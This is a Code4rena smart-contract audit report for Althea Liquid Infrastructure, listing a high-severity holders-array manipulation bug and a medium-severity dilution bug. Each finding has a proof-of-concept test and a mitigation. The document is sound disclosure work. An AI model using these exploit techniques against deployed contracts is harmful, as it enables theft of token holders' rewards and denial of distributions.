---
sponsor: "Althea Liquid Infrastructure"
slug: "2024-02-althea-liquid-infrastructure"
date: "2024-04-08"
title: "Althea Liquid Infrastructure"
findings: "https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues"
contest: 331
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Althea Liquid Infrastructure smart contract system written in Solidity. The audit took place between February 13 — February 19, 2024.

## Wardens

93 Wardens contributed reports to Althea Liquid Infrastructure:

  1. [Fassi\_Security](https://code4rena.com/@Fassi_Security) ([bronze\_pickaxe](https://code4rena.com/@bronze_pickaxe) and [mxuse](https://code4rena.com/@mxuse))
  2. [max10afternoon](https://code4rena.com/@max10afternoon)
  3. [web3pwn](https://code4rena.com/@web3pwn)
  4. [0xJoyBoy03](https://code4rena.com/@0xJoyBoy03)
  5. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  6. [Breeje](https://code4rena.com/@Breeje)
  7. [0xAadi](https://code4rena.com/@0xAadi)
  8. [MrPotatoMagic](https://code4rena.com/@MrPotatoMagic)
  9. [BowTiedOriole](https://code4rena.com/@BowTiedOriole)
  10. [rouhsamad](https://code4rena.com/@rouhsamad)
  11. [JohnSmith](https://code4rena.com/@JohnSmith)
  12. [juancito](https://code4rena.com/@juancito)
  13. [nuthan2x](https://code4rena.com/@nuthan2x)
  14. [Krace](https://code4rena.com/@Krace)
  15. [d3e4](https://code4rena.com/@d3e4)
  16. [SovaSlava](https://code4rena.com/@SovaSlava)
  17. [CaeraDenoir](https://code4rena.com/@CaeraDenoir)
  18. [Meera](https://code4rena.com/@Meera)
  19. [kutugu](https://code4rena.com/@kutugu)
  20. [rokinot](https://code4rena.com/@rokinot)
  21. [PumpkingWok](https://code4rena.com/@PumpkingWok)
  22. [ZanyBonzy](https://code4rena.com/@ZanyBonzy)
  23. [jesjupyter](https://code4rena.com/@jesjupyter)
  24. [peanuts](https://code4rena.com/@peanuts)
  25. [TheSavageTeddy](https://code4rena.com/@TheSavageTeddy)
  26. [0x11singh99](https://code4rena.com/@0x11singh99)
  27. [0xSmartContractSamurai](https://code4rena.com/@0xSmartContractSamurai)
  28. [zhaojohnson](https://code4rena.com/@zhaojohnson)
  29. [dharma09](https://code4rena.com/@dharma09)
  30. [c3phas](https://code4rena.com/@c3phas)
  31. [Limbooo](https://code4rena.com/@Limbooo)
  32. [aslanbek](https://code4rena.com/@aslanbek)
  33. [pkqs90](https://code4rena.com/@pkqs90)
  34. [0xloscar01](https://code4rena.com/@0xloscar01)
  35. [matejdb](https://code4rena.com/@matejdb)
  36. [n0kto](https://code4rena.com/@n0kto)
  37. [0xpiken](https://code4rena.com/@0xpiken)
  38. [thank\_you](https://code4rena.com/@thank_you)
  39. [Tendency](https://code4rena.com/@Tendency)
  40. [JrNet](https://code4rena.com/@JrNet)
  41. [Topmark](https://code4rena.com/@Topmark)
  42. [DarkTower](https://code4rena.com/@DarkTower) ([OxTenma](https://code4rena.com/@OxTenma), [0xrex](https://code4rena.com/@0xrex) and [haxatron](https://code4rena.com/@haxatron))
  43. [atoko](https://code4rena.com/@atoko)
  44. [clara](https://code4rena.com/@clara)
  45. [0xbrett8571](https://code4rena.com/@0xbrett8571)
  46. [PoeAudits](https://code4rena.com/@PoeAudits)
  47. [JcFichtner](https://code4rena.com/@JcFichtner)
  48. [0x0bserver](https://code4rena.com/@0x0bserver)
  49. [DanielArmstrong](https://code4rena.com/@DanielArmstrong)
  50. [turvy\_fuzz](https://code4rena.com/@turvy_fuzz)
  51. [csanuragjain](https://code4rena.com/@csanuragjain)
  52. [AM](https://code4rena.com/@AM) ([StefanAndrei](https://code4rena.com/@StefanAndrei) and [0xmatei](https://code4rena.com/@0xmatei))
  53. [agadzhalov](https://code4rena.com/@agadzhalov)
  54. [offside0011](https://code4rena.com/@offside0011)
  55. [kartik\_giri\_47538](https://code4rena.com/@kartik_giri_47538)
  56. [KmanOfficial](https://code4rena.com/@KmanOfficial)
  57. [imare](https://code4rena.com/@imare)
  58. [Kirkeelee](https://code4rena.com/@Kirkeelee)
  59. [ziyou-](https://code4rena.com/@ziyou-)
  60. [xchen1130](https://code4rena.com/@xchen1130)
  61. [kinda\_very\_good](https://code4rena.com/@kinda_very_good)
  62. [lsaudit](https://code4rena.com/@lsaudit)
  63. [pontifex](https://code4rena.com/@pontifex)
  64. [psb01](https://code4rena.com/@psb01)
  65. [ReadyPlayer2](https://code4rena.com/@ReadyPlayer2)
  66. [CodeWasp](https://code4rena.com/@CodeWasp) ([slylandro\_star](https://code4rena.com/@slylandro_star), [kuprum](https://code4rena.com/@kuprum), [audithare](https://code4rena.com/@audithare) and [spaghetticode\_sentinel](https://code4rena.com/@spaghetticode_sentinel))
  67. [spark](https://code4rena.com/@spark)
  68. [0xlamide](https://code4rena.com/@0xlamide)
  69. [pynschon](https://code4rena.com/@pynschon)
  70. [gesha17](https://code4rena.com/@gesha17)
  71. [Brenzee](https://code4rena.com/@Brenzee)
  72. [Honour](https://code4rena.com/@Honour)
  73. [Fitro](https://code4rena.com/@Fitro)
  74. [shaflow2](https://code4rena.com/@shaflow2)
  75. [Babylen](https://code4rena.com/@Babylen)
  76. [slippopz](https://code4rena.com/@slippopz)
  77. [miaowu](https://code4rena.com/@miaowu)
  78. [Myrault](https://code4rena.com/@Myrault)
  79. [krikolkk](https://code4rena.com/@krikolkk)
  80. [cryptphi](https://code4rena.com/@cryptphi)
  81. [0xlemon](https://code4rena.com/@0xlemon)
  82. [Tigerfrake](https://code4rena.com/@Tigerfrake)
  83. [parlayan\_yildizlar\_takimi](https://code4rena.com/@parlayan_yildizlar_takimi) ([ata](https://code4rena.com/@ata), [caglankaan](https://code4rena.com/@caglankaan) and [ulas](https://code4rena.com/@ulas))
  84. [petro\_1912](https://code4rena.com/@petro_1912)

This audit was judged by [0xA5DF](https://code4rena.com/@0xA5DF).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 5 unique vulnerabilities. Of these vulnerabilities, 1 received a risk rating in the category of HIGH severity and 4 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 10 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 4 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Althea Liquid Infrastructure repository](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure), and is composed of 3 smart contracts written in the Solidity programming language and includes 377 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **TragedyOTCommons** from warden IllIllI, generated the [Automated Findings report](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/bot-report.md) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (1)

## [[H-01] Holders array can be manipulated by transferring or burning with amount 0, stealing rewards or bricking certain functions](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/77)
*Submitted by [BowTiedOriole](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/77), also found by 0xJoyBoy03 ([1](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/760), [2](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/727)), [pontifex](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/713), [0x0bserver](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/676), [psb01](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/666), [ReadyPlayer2](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/547), [rouhsamad](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/536), [CodeWasp](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/534), [DanielArmstrong](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/491), [n0kto](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/435), [0xpiken](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/411), Krace ([1](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/404), [2](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/393)), nuthan2x ([1](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/399), [2](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/102)), [spark](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/394), kinda\_very\_good ([1](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/392), [2](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/388)), [0xlamide](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/381), [pynschon](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/366), [gesha17](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/365), [MrPotatoMagic](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/339), [Brenzee](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/331), [Honour](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/320), [DarkTower](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/287), [turvy\_fuzz](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/285), [Fitro](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/264), [shaflow2](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/250), [Babylen](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/247), [slippopz](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/243), [d3e4](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/240), matejdb ([1](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/239), [2](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/153)), [web3pwn](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/225), max10afternoon ([1](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/194), [2](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/191)), 0xAadi ([1](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/193), [2](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/171)), [JohnSmith](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/186), [miaowu](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/180), [Myrault](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/175), [krikolkk](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/160), TheSavageTeddy ([1](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/146), [2](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/101)), [SovaSlava](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/141), [atoko](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/134), [Breeje](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/129), [cryptphi](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/122), [0xlemon](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/94), [SpicyMeatball](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/67), [Tigerfrake](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/55), [parlayan\_yildizlar\_takimi](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/28), [csanuragjain](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/26), [petro\_1912](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/17), [zhaojohnson](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/763), [peanuts](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/762), and [Fassi\_Security](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/162)*

### Lines of code

<https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L214-L231>

### Impact

`LiquidInfrastructureERC20._beforeTokenTransfer()` checks if the `to` address has a balance of `0`, and if so, adds the address to the holders array.

[LiquidInfrastructureERC20#L142-145](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L142-L145)

```solidity
bool exists = (this.balanceOf(to) != 0);
if (!exists) {
    holders.push(to);
}
```

However, the ERC20 contract allows for transferring and burning with `amount = 0`, enabling users to manipulate the holders array.

An approved user that has yet to receive tokens can initiate a transfer from another address to themself with an amount of `0`. This enables them to add their address to the holders array multiple times. Then, `LiquidInfrastructureERC20.distribute()` will loop through the user multiple times and give the user more rewards than it should.

```solidity
for (i = nextDistributionRecipient; i < limit; i++) {
    address recipient = holders[i];
    if (isApprovedHolder(recipient)) {
        uint256[] memory receipts = new uint256[](
            distributableERC20s.length
        );
        for (uint j = 0; j < distributableERC20s.length; j++) {
            IERC20 toDistribute = IERC20(distributableERC20s[j]);
            uint256 entitlement = erc20EntitlementPerUnit[j] *
                this.balanceOf(recipient);
            if (toDistribute.transfer(recipient, entitlement)) {
                receipts[j] = entitlement;
            }
        }

        emit Distribution(recipient, distributableERC20s, receipts);
    }
}
```

This also enables any user to call burn with an amount of `0`, which will push the zero address to the holders array causing it to become very large and prevent `LiquidInfrastructureERC20.distributeToAllHolders()` from executing.

### Proof of Concept

```typescript
it("malicious user can add himself to holders array multiple times and steal rewards", async function () {
    const { infraERC20, erc20Owner, nftAccount1, holder1, holder2 } = await liquidErc20Fixture();
    const nft = await deployLiquidNFT(nftAccount1);
    const erc20 = await deployERC20A(erc20Owner);

    await nft.setThresholds([await erc20.getAddress()], [parseEther('100')]);
    await nft.transferFrom(nftAccount1.address, await infraERC20.getAddress(), await nft.AccountId());
    await infraERC20.addManagedNFT(await nft.getAddress());
    await infraERC20.setDistributableERC20s([await erc20.getAddress()]);

    const OTHER_ADDRESS = '0x1111111111111111111111111111111111111111'

    await infraERC20.approveHolder(holder1.address);
    await infraERC20.approveHolder(holder2.address);

    // Malicious user transfers 0 to himself to add himself to the holders array
    await infraERC20.transferFrom(OTHER_ADDRESS, holder1.address, 0);

    // Setup balances
    await infraERC20.mint(holder1.address, parseEther('1'));
    await infraERC20.mint(holder2.address, parseEther('1'));
    await erc20.mint(await nft.getAddress(), parseEther('2'));
    await infraERC20.withdrawFromAllManagedNFTs();

    // Distribute to all holders fails because holder1 is in the holders array twice
    // Calling distribute with 2 sends all funds to holder1
    await mine(500);
    await expect(infraERC20.distributeToAllHolders()).to.be.reverted;
    await expect(() => infraERC20.distribute(2))
        .to.changeTokenBalances(erc20, [holder1, holder2], [parseEther('2'), parseEther('0')]);
    expect(await erc20.balanceOf(await infraERC20.getAddress())).to.eq(parseEther('0'));
});

it("malicious user can add zero address to holders array", async function () {
    const { infraERC20, erc20Owner, nftAccount1, holder1 } = await liquidErc20Fixture();

    for (let i = 0; i < 10; i++) {
        await infraERC20.burn(0);
    }
    // I added a getHolders view function to better see this vulnerability
    expect((await infraERC20.getHolders()).length).to.eq(10);
});
```

### Recommended Mitigation Steps

Adjust the logic in `_beforeTokenTransfer` to ignore burns, transfers where the amount is `0`, and transfers where the recipient already has a positive balance.

```diff
function _beforeTokenTransfer(
    address from,
    address to,
    uint256 amount
) internal virtual override {
    require(!LockedForDistribution, "distribution in progress");
    if (!(to == address(0))) {
        require(
            isApprovedHolder(to),
            "receiver not approved to hold the token"
        );
    }
    if (from == address(0) || to == address(0)) {
        _beforeMintOrBurn();
    }
-   bool exists = (this.balanceOf(to) != 0);
-   if (!exists) {
+   if (to != address(0) && balanceOf(to) == 0 && amount > 0)
       holders.push(to);
   }
}
```

### Assessed type

Token Transfer

**[ChristianBorst (Althea) confirmed and commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/77#issuecomment-1973729369):**
 > This is a significant issue since it is a DoS attack vector and can cause miscalculation of entitlements. I also think the report is very clear in outlining the issue.

***
 
# Medium Risk Findings (4)

## [[M-01] `LiquidInfrastructureERC20.sol` disapproved holders keep part of the supply, diluting approved holders revenue.](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/703)
*Submitted by [0xloscar01](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/703), also found by [Breeje](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/766), [Limbooo](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/695), [rouhsamad](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/651), [n0kto](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/456), [0xAadi](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/438), jesjupyter ([1](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/428), [2](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/413)), [0xpiken](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/421), [peanuts](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/301), [thank\_you](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/297), [zhaojohnson](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/291), [pkqs90](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/263), [Tendency](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/252), [max10afternoon](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/231), [matejdb](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/210), [BowTiedOriole](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/117), [Fassi\_Security](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/115), [aslanbek](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/109), [SpicyMeatball](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/66), [ZanyBonzy](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/61), [JohnSmith](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/60), [Topmark](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/199), and [atoko](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/126)*

### Lines of code

<https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L222>

### Impact

When `LiquidInfrastructureERC20` owner disapproves a holder, it prevents the holder from receiving any revenue from the contract. However, the disapproved holder will still keep part of the supply, diluting the revenue of the approved holders.

The dilution is a result of the calculation of the entitlements per token held, which is based on the division of the ERC20 balances held by the `LiquidInfrastructureERC20` contract and the total supply of the `LiquidInfrastructureERC20` token.

<https://github.com/code-423n4/2024-02-althea-liquid-infrastructure/blob/main/liquid-infrastructure/contracts/LiquidInfrastructureERC20.sol#L257-L281>

```solidity
    function _beginDistribution() internal {
        require(
            !LockedForDistribution,
            "cannot begin distribution when already locked"
        );
        LockedForDistribution = true;

        // clear the previous entitlements, if any
        if (erc20EntitlementPerUnit.length > 0) {
            delete erc20EntitlementPerUnit;
        }

        // Calculate the entitlement per token held
        uint256 supply = this.totalSupply();
        for (uint i = 0; i < distributableERC20s.length; i++) {
            uint256 balance = IERC20(distributableERC20s[i]).balanceOf(
                address(this)
            );
@>            uint256 entitlement = balance / supply;
            erc20EntitlementPerUnit.push(entitlement);
        }

        nextDistributionRecipient = 0;
        emit DistributionStarted();
    }
```

### Proof of Concept

Test Case:

```solidity
    function test_dilutedDistribution() public {
        address nftOwner1 = makeAddr("nftOwner1");
        uint256 rewardAmount1 = 1000000;
        nftOwners = [nftOwner1];

        vm.prank(nftOwner1);
        LiquidInfrastructureNFT nft1 = new LiquidInfrastructureNFT("nftAccount1");

        nfts = [nft1];

        // Register one NFT as a source of reward erc20s

        uint256 accountId = nft1.AccountId();

        thresholdAmounts = [0];

        // Transfer the NFT to ERC20 and manage

        vm.startPrank(nftOwner1);
        nft1.setThresholds(erc20Addresses, thresholdAmounts);
        nft1.transferFrom(nftOwner1, address(infraERC20), accountId);
        
        vm.stopPrank();
        assertEq(nft1.ownerOf(accountId), address(infraERC20));
        vm.expectEmit(address(infraERC20));
        emit AddManagedNFT(address(nft1));
        vm.startPrank(erc20Owner);
        infraERC20.addManagedNFT(address(nft1));
        vm.roll(1);

        // Allocate rewards to the NFT
        erc20A.transfer(address(nft1), rewardAmount1);
        assertEq(erc20A.balanceOf(address(nft1)), rewardAmount1);

        // And then send the rewards to the ERC20

        infraERC20.withdrawFromAllManagedNFTs();

        // Approve holders
        infraERC20.approveHolder(address(holder1));
        infraERC20.approveHolder(address(holder2));

        // Mint LiquidInfrastructureERC20 tokens to holders
        // 200 total supply of LiquidInfrastructureERC20 tokens
        infraERC20.mint(address(holder1), 100);
        infraERC20.mint(address(holder2), 100); 

        // Wait for the minimum distribution period to pass
        vm.roll(vm.getBlockNumber() + 500);

        // Distribute revenue to holders
        infraERC20.distributeToAllHolders();
        console.log("First distribution (2 approved holders) \n  balance of holder 1: %s", erc20A.balanceOf(address(holder1)));
        console.log("balance of holder 2: %s", erc20A.balanceOf(address(holder2)));
        console.log("balance remaining in infraERC20: %s", erc20A.balanceOf(address(infraERC20)));

        // Wait for the minimum distribution period to pass
        vm.roll(vm.getBlockNumber() + 500);

        // Allocate more rewards to the NFT
        erc20A.transfer(address(nft1), rewardAmount1);
        infraERC20.withdrawFromAllManagedNFTs();

        // Holder 2 is no longer approved
        infraERC20.disapproveHolder(address(holder2));

        // Now there is 1 holder remaining, but the rewards are diluted
        infraERC20.distributeToAllHolders();

        console.log("\n  Second distribution (1 approved holder) \n  balance of holder 1: %s", erc20A.balanceOf(address(holder1)));
        console.log("balance of holder 2: %s", erc20A.balanceOf(address(holder2)));

        // There is remaining unallocated rewards in the contract
        console.log("balance remaining in infraERC20: %s", erc20A.balanceOf(address(infraERC20)));
        // holder 2 has 100 LiquidInfrastructureERC20 tokens, this dilutes the rewards
        assertEq(infraERC20.balanceOf(address(holder2)), 100);

        // Wait for the minimum distribution period to pass
        vm.roll(vm.getBlockNumber() + 500);

        // Distribute revenue to holders
        infraERC20.distributeToAllHolders();
        console.log("\n  Third distribution (1 approved holder) \n  balance of holder 1: %s", erc20A.balanceOf(address(holder1)));
        console.log("balance of holder 2: %s", erc20A.balanceOf(address(holder2)));
        console.log("balance remaining in infraERC20: %s", erc20A.balanceOf(address(infraERC20)));
    }
```

Logs:

      First distribution (2 approved holders)
      balance of holder 1: 500000
      balance of holder 2: 500000
      balance remaining in infraERC20: 0

      Second distribution (1 approved holder)
      balance of holder 1: 1000000
      balance of holder 2: 500000
      balance remaining in infraERC20: 500000

      Third distribution (1 approved holder)
      balance of holder 1: 1250000
      balance of holder 2: 500000
      balance remaining in infraERC20: 250000

Steps to reproduce the test:

Inside the `2024-02-althea-liquid-infrastructure/liquid-infrastructure` folder:

1. `npm i --save-dev @nomicfoundation/hardhat-foundry` - Install the hardhat-foundry plugin.
2. Add `require("@nomicfoundation/hardhat-foundry");` to the top of the `hardhat.config.js` file.
3. Run `npx hardhat init-foundry` in the terminal. This will generate a `foundry.toml` file based on the Hardhat project's existing configuration, and will install the forge-std library.
4. Copy the full test suite case from below and paste it in a new file: `2024-02-althea-liquid-infrastructure/liquid-infrastructure/test/liquidInfrastructureERC20Test.t.sol`
5. Run `forge test --mt test_dilutedDistribution -vv` in the terminal.

Full Test Suite:

<details>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {Test, console} from "forge-std/Test.sol";
import {TestERC20A} from "../contracts/TestERC20A.sol";
import {LiquidInfrastructureERC20} from "../contracts/LiquidInfrastructureERC20.sol";
import {LiquidInfrastructureNFT} from "../contracts/LiquidInfrastructureNFT.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract LiquidInfrastructureERC20Test is Test {
    event AddManagedNFT(address nft);

    address nftAccount1 = makeAddr("nftAccount1");
    address erc20Owner = makeAddr("erc20Owner");
    address holder1 = makeAddr("holder1");
    address holder2 = makeAddr("holder2");

    LiquidInfrastructureERC20 infraERC20;
    address[] managedNFTs;
    address[] approvedHolders;
    address[] holders;
    address[] nftOwners;
    uint256[] thresholdAmounts;
    LiquidInfrastructureNFT[] nfts;
    ERC20[] rewardErc20s;

    TestERC20A erc20A;

    address[] erc20Addresses;

    function setUp() public {
        vm.startPrank(erc20Owner);
        erc20A = new TestERC20A();

        erc20Addresses.push(address(erc20A));

        infraERC20 = new LiquidInfrastructureERC20({
            _name: "Infra",
            _symbol: "INFRA",
            _managedNFTs: managedNFTs,
            _approvedHolders: approvedHolders,
            _minDistributionPeriod: 500,
            _distributableErc20s: erc20Addresses
        });
        vm.stopPrank();
    }

    function test_dilutedDistribution() public {
        address nftOwner1 = makeAddr("nftOwner1");
        uint256 rewardAmount1 = 1000000;
        nftOwners = [nftOwner1];

        vm.prank(nftOwner1);
        LiquidInfrastructureNFT nft1 = new LiquidInfrastructureNFT("nftAccount1");

        nfts = [nft1];

        // Register one NFT as a source of reward erc20s

        uint256 accountId = nft1.AccountId();

        thresholdAmounts = [0];

        // Transfer the NFT to ERC20 and manage

        vm.startPrank(nftOwner1);
        nft1.setThresholds(erc20Addresses, thresholdAmounts);
        nft1.transferFrom(nftOwner1, address(infraERC20), accountId);
        
        vm.stopPrank();
        assertEq(nft1.ownerOf(accountId), address(infraERC20));
        vm.expectEmit(address(infraERC20));
        emit AddManagedNFT(address(nft1));
        vm.startPrank(erc20Owner);
        infraERC20.addManagedNFT(address(nft1));
        vm.roll(1);

        // Allocate rewards to the NFT
        erc20A.transfer(address(nft1), rewardAmount1);
        assertEq(erc20A.balanceOf(address(nft1)), rewardAmount1);

        // And then send the rewards to the ERC20

        infraERC20.withdrawFromAllManagedNFTs();

        // Approve holders
        infraERC20.approveHolder(address(holder1));
        infraERC20.approveHolder(address(holder2));

        // Mint LiquidInfrastructureERC20 tokens to holders
        // 200 total supply of LiquidInfrastructureERC20 tokens
        infraERC20.mint(address(holder1), 100);
        infraERC20.mint(address(holder2), 100); 

        // Wait for the minimum distribution period to pass
        vm.roll(vm.getBlockNumber() + 500);

        // Distribute revenue to holders
        infraERC20.distributeToAllHolders();
        console.log("First distribution (2 approved holders) \n  balance of holder 1: %s", erc20A.balanceOf(address(holder1)));
        console.log("balance of holder 2: %s", erc20A.balanceOf(address(holder2)));
        console.log("balance remaining in infraERC20: %s", erc20A.balanceOf(address(infraERC20)));

        // Wait for the minimum distribution period to pass
        vm.roll(vm.getBlockNumber() + 500);

        // Allocate more rewards to the NFT
        erc20A.transfer(address(nft1), rewardAmount1);
        infraERC20.withdrawFromAllManagedNFTs();

        // Holder 2 is no longer approved
        infraERC20.disapproveHolder(address(holder2));

        // Now there is 1 holder remaining, but the rewards are diluted
        infraERC20.distributeToAllHolders();

        console.log("\n  Second distribution (1 approved holder) \n  balance of holder 1: %s", erc20A.balanceOf(address(holder1)));
        console.log("balance of holder 2: %s", erc20A.balanceOf(address(holder2)));

        // There is remaining unallocated rewards in the contract
        console.log("balance remaining in infraERC20: %s", erc20A.balanceOf(address(infraERC20)));
        // holder 2 has 100 LiquidInfrastructureERC20 tokens, this dilutes the rewards
        assertEq(infraERC20.balanceOf(address(holder2)), 100);

        // Wait for the minimum distribution period to pass
        vm.roll(vm.getBlockNumber() + 500);

        // Distribute revenue to holders
        infraERC20.distributeToAllHolders();
        console.log("\n  Third distribution (1 approved holder) \n  balance of holder 1: %s", erc20A.balanceOf(address(holder1)));
        console.log("balance of holder 2: %s", erc20A.balanceOf(address(holder2)));
        console.log("balance remaining in infraERC20: %s", erc20A.balanceOf(address(infraERC20)));
    }
}
```

</details>

### Recommended Mitigation Steps

To prevent dilution of revenue for approved holders, consider implementing a mechanism to burn the tokens of disapproved holders upon disapproval.

In the event that disapproved holders are intended to retain their tokens for potential reapproval in the future, track the balance of the `LiquidInfrastructureERC20` tokens held by the holder at the time of their disapproval. Subsequently, burn the tokens. Upon reapproval, mint the same amount of tokens to the holder, ensuring they regain their previous token balance.

**[ChristianBorst (Althea) confirmed and commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/703#issuecomment-1974262944):**
 > This is a good suggestion.

**[0xA5DF (judge) commented](https://github.com/code-423n4/2024-02-althea-liquid-infrastructure-findings/issues/703#issuecomment-1976753505):**
 > Maintaining medium severity (despite some dupes suggesting high) since this would only affect part of the revenue (% of disapproved supply) and the funds aren't lost forever - they're kept in the contract and will be distributed in the next round.

